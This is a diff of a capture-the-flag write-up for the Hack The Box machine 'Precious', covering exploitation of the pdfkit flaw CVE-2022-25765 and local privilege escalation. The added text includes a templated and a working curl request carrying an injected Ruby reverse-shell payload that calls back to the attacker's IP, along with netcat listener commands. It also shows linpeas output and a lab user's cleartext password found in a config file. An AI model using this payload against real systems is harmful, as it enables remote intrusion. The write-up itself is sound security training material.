@@ -178,13 +178,19 @@ exiftool ~/Downloads/u3k8cdohntpcw26oda5vcsnjcq8vo8k6.pdf
 
 <figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>pdfkit v0.8.6 has been identified; we should look into this</p></figcaption></figure>
 
+We can also view this same information in the request used to convert a web page to a PDF by capturing it in Burp:
+
+<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption><p>Burp request</p></figcaption></figure>
+
+<mark style="color:yellow;">This is why it is so important to enumerate! When enumerating, you want to view EVERYTHING; time permitting!</mark>
+
 ### OSINT
 
 {% embed url="https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell" %}
 
 By simply Googling "<mark style="color:yellow;">pdfkit v0.8.6</mark>", I was able to quickly find multiple references to <mark style="color:yellow;">CVE-2022-25765</mark>
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
 
@@ -197,7 +203,7 @@ After I was able to confirm code execution was taking place, the next logical st
 Start HTTP server:
 
 ```
-python3 -m http.server
+python3 -m http.server 80
 ```
 
 Start nc listener:
@@ -208,13 +214,27 @@ nc -lnvp 1337
 
 Via Curl Method:&#x20;
 
+PoC:
+
 {% code overflow="wrap" %}
 ```
-curl 'http://precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.38%3A1337%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.38%22%2C1337%29%29%27%60'
+CURL (modify bold values): curl 'TARGET-URL' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_URL' -H 'Connection: keep-alive' -H 'Referer: TARGET_URL' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-IP%3ALOCAL-HTTP-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2CLOCAL-LISTEN-PORT%29%29%27%60'
 ```
 {% endcode %}
 
+Working Exploit:
+
+{% code overflow="wrap" %}
+```
+curl 'http://precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.97%3A80%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.97%22%2C1337%29%29%27%60'
+```
+{% endcode %}
+
+* Note that you need to put your port number of your local web server in the third-to-last entry&#x20;
+
 <mark style="color:yellow;">Ruby SSTI Python-based Reverse Shell Payload</mark>:
+
+* You can place this directly into the web app and obtain a reverse shell
 
 {% code overflow="wrap" %}
 ```
@@ -244,7 +264,123 @@ There was another way of doing this... If you download the generated PDF, you ca
 
 ## Privilege Escalation
 
+We spawned in as the <mark style="color:yellow;">ruby</mark> user. There is another user named <mark style="color:red;">henry</mark> on the box too.
+
 ### Local enumeration
 
+* I was unable to find anything where I spawned unfortunately
+* There is strange port running internally -- 127.0.0.1:35389
+  * Tried curling but it returned "request empty" maybe we should google this
+*
+
+#### File System Enumeration
+
+```
+// Some code
+```
+
+#### Linpeas
+
+```
+/etc/nginx/sites-available/pdfapp.conf
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 16
+drwxr-xr-x  3 root root 4096 Oct 26 08:28 .
+drwxr-xr-x 18 root root 4096 Nov 21 15:11 ..
+drwxr-xr-x  2 root root 4096 Oct 26 08:28 sample
+-rwxr-xr-x  1 root root  848 Sep 25  2022 update_dependencies.rb
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+2022-11-21+15:15:08.0729708500 /usr/local/sbin/laurel
+2022-09-26+05:04:43.6880195170 /home/ruby/.bundle/config
+2022-09-26+05:04:42.9800195060 /usr/local/bin/tilt
+2022-09-26+05:04:42.8480195040 /usr/local/bin/rackup
+2022-09-26+05:04:39.0520194460 /usr/local/bin/bundler
+2022-09-26+05:04:39.0520194460 /usr/local/bin/bundle
+
+/home/henry/user.txt
+/home/henry/.bash_history
+/home/ruby/.bundle
+************ /home/ruby/.bundle/config ************
+/home/ruby/.bash_history
+
+/etc/pam.d/common-password
+/tmp/passenger.hFvr192/full_admin_password.txt
+/tmp/passenger.hFvr192/read_only_admin_password.txt
+```
+
 ### PrivEsc vector
+
+<mark style="color:yellow;">ruby</mark> -> <mark style="color:red;">henry</mark>
+
+```
+************ /home/ruby/.bundle/config ************
+```
+
+Cleartext credentials:
+
+```
+cat /home/ruby/.bundle/config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+```
+
+Escalate to <mark style="color:red;">henry</mark> user:
+
+```
+su henry
+password: Q3c1AqGHtoI0aXAYFH
+```
+
+<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption><p>Cleartext credentials for henry found</p></figcaption></figure>
+
+<mark style="color:red;">henry</mark> -> <mark style="color:green;">root</mark>
+
+The first thing that I did was run `sudo -l` and this was the output:
+
+```
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+/opt/update\_dependencies.rb:
+
+```
+# Compare installed dependencies with those specified in "dependencies.yml"
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts "Installed version differs from the one specified in file: " + local_name
+            else
+                puts "Installed version is equals to the one specified in file: " + local_name
+            end
+        end
+    end
+end
+```
+
+
 
